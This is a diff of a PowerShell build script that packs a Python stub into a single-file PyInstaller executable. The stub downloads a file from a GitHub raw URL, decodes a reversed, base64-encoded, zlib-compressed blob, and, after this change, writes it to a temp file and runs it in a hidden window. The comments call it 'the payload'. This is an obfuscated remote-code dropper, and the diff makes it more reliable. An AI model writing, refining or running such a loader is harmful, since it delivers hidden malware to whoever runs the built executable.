@@ -111,14 +111,30 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
+# Download the payload to a temp file and run it locally
 $stubBody = @"
-import urllib.request, base64, zlib, re, sys
+import urllib.request, base64, zlib, re, sys, os, tempfile, subprocess
+
 url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'
+
 try:
     req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
     s = urllib.request.urlopen(req).read().decode()
-    p = re.search(r"b'([^']+)'", s).group(1)
-    exec(zlib.decompress(base64.b64decode(p[::-1])).decode())
+    
+    match = re.search(r"b'([^']+)'", s)
+    if not match:
+        sys.exit(0)
+        
+    p = match.group(1)
+    decoded_code = zlib.decompress(base64.b64decode(p[::-1])).decode()
+    
+    # Write payload to a temp file and execute it
+    fd, temp_path = tempfile.mkstemp(suffix=".py")
+    with os.fdopen(fd, 'w', encoding='utf-8') as f:
+        f.write(decoded_code)
+        
+    subprocess.Popen([sys.executable, temp_path], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
+    sys.exit(0)
 except Exception:
     sys.exit(0)
 "@
@@ -176,13 +192,12 @@ except Exception as e:
     }
 }
 
-Log step "Freezing executable..."
+Log step "Freezing executable (this may take a minute)..."
 
-# Added --noconsole to prevent Tkinter popups from showing
+# Removed --noconsole so the payload can spawn a window if it needs to
 $pyiArgs = @(
     "-m", "PyInstaller",
     "--onefile",
-    "--noconsole",
     "--noconfirm",
     "--clean",
     "--hidden-import", "ctypes",
